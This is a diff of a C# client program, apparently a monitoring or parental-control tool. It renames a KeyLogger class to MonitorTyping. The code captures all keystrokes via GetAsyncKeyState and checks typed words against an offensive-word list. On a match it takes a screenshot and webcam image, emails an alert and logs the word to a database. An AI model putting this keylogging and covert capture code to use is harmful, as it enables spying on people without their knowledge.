@@ -5,22 +5,24 @@ using System.Linq;
 using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Text.RegularExpressions;
+using System.Text.RegularExpressions;  
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace ClientSide
-{
-    class KeyLogger
+{  
+    class MonitorTyping
     {
+        public bool monitorTypingIAlive;
         public DBclient dbs;
         public setSetting set;
         public Thread keyLogger;
         public string input = "";
 
-        public KeyLogger(DBclient dbs, setSetting set)
+        public MonitorTyping(DBclient dbs, setSetting set)
         {
+            monitorTypingIAlive = true;
             this.dbs = dbs;
             this.set = set;
             keyLogger = new Thread(playKeyLogger);
@@ -39,43 +41,36 @@ namespace ClientSide
 
         public void playKeyLogger()
         {
-            string[] a = set.getWord();
+            List<string> offensiveWords = set.getWord();
             input = "";
-            Boolean flag = true;
+            bool flag = true;
             while (flag)
             {
                 Thread.Sleep(5);
                 for (int i = 32; i < 127; i++)
                 {
-
                     int keyState = GetAsyncKeyState(i);
                     if (keyState == 32769)
                     {
-
                         input += (char)i; 
 
-                        if (i == 32)
+                        if (i == 32) // if type space 
                         {
+                             
                             wordFromKeylogger handler = Program.updateCurrentKeylogger;
                             handler(input);
 
                             //ShowErrorDialog(input);
                             string replacement = input.Replace(" ", "");
                             //ShowErrorDialog(replacement);
-                             foreach (string x in a)
+                             foreach (string badWord in offensiveWords)
                              {
 
-                                 string xb = x.Replace(" ", "");
-
-                                 if (replacement.ToLower().Equals(x))
+                                 string xb = badWord.Replace(" ", "");
+                                 if (replacement.ToLower().Equals(badWord))
                                  {
-                                     ShowErrorDialog("bad word insert");
-                                     dbs.connectToDatabase();
-                                     dbs.fillTable(1, DateTime.Now.ToString(),"\"" +x +"\"");
-                                     //string AllApp = ShowAllProcess.ListAllWebSite();
-                                     //ShowErrorDialog("ListAllWebSite: \n" + AllApp);
-
-                                }
+                                     reportOrSendAlert(badWord);                                  
+                                 }
                             }
                             input = "";
                         }
@@ -86,7 +81,25 @@ namespace ClientSide
             }  
 
         }
+     
+        private void reportOrSendAlert(string badWord)
+        {
+            if (set.triggersForAlert.Contains("badWord") == true)
+            {
+                string FilePic = Picters.ScreenCapture();
+                Picters.CaptureCamera(FilePic);
+                Report.sendAlertToMail(FilePic, "badWord trigger occur");
+                ShowErrorDialog("send alert to mail\nTypedin trigger occur\nword: " + badWord );
 
+            }
+
+            if (set.triggersForReport.Contains("badWord") == true)
+            {
+                dbs.connectToDatabase();
+                dbs.fillTable(1, DateTime.Now.ToString(), "\"" + badWord + "\"");
+                ShowErrorDialog("update DB\nTypedin trigger occur\nword: " + badWord);
+            }
+        }
 
         public  void inputEqualsSARA()
         {
@@ -125,4 +138,4 @@ namespace ClientSide
         }
     }
 }
-//SARA SARA 
+//abbabb
